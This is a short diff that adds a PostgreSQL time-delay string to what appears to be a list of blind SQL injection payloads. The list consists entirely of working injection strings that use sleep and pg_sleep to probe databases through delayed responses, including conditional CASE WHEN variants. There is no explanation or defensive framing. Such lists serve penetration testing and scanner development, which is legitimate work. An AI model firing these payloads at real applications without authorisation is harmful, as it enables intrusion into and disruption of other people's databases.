@@ -1,3 +1,4 @@
+'||pg_sleep(20)--
 '+(select*from(select(sleep(20)))a)+'
 SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
 '; SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
